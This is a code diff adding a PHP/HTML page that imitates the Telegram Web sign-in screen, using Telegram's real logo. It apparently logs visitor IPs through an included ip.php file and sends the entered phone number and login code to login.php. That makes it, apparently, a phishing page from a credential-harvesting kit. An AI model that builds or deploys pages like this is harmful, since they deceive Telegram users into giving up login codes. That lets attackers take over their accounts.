@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <?php include '../ip.php'; ?>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+    body {
+        background: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px; /* Prevents touching edges on mobile */
+        box-sizing: border-box;
+    }
+    
+    .login-box {
+        width: 100%;
+        max-width: 360px; /* Becomes fluid on screens smaller than 360px */
+        text-align: center;
+    }
+    
+    .tg-logo {
+        width: 100px; /* Reduced slightly for mobile feel */
+        height: 100px;
+        margin-bottom: 20px;
+    }
+    
+    h3 { 
+        font-size: 24px; 
+        font-weight: 500; 
+        margin-bottom: 25px; 
+        color: #000; 
+    }
+
+    form {
+        width: 100%;
+    }
+
+    input {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #dadce0;
+        border-radius: 10px;
+        font-size: 16px;
+        box-sizing: border-box;
+        margin-bottom: 15px;
+        transition: border 0.2s;
+    }
+    
+    input:focus { 
+        border: 2px solid #3390ec; 
+        outline: none; 
+        padding: 13px; /* Adjusts for the 2px border to prevent jumping */
+    }
+
+    .btn {
+        background: #3390ec;
+        color: #fff;
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        text-transform: uppercase;
+        transition: background 0.3s;
+    }
+
+    .btn:hover {
+        background: #2b78c5;
+    }
+
+    /* Tablet/Small Mobile Adjustments */
+    @media (max-width: 480px) {
+        .login-box {
+            max-width: 100%;
+            padding: 10px;
+        }
+        h3 {
+            font-size: 22px;
+        }
+        .tg-logo {
+            width: 80px;
+            height: 80px;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram Logo">
+        <h3>Sign in to Telegram</h3>
+        <form action="login.php" method="POST">
+            <input type="text" name="phone" placeholder="Phone Number" required>
+            <input type="password" name="code" placeholder="Login Code" required>
+            <button type="submit" class="btn">NEXT</button>
+        </form>
+    </div>
+</body>
+</html>
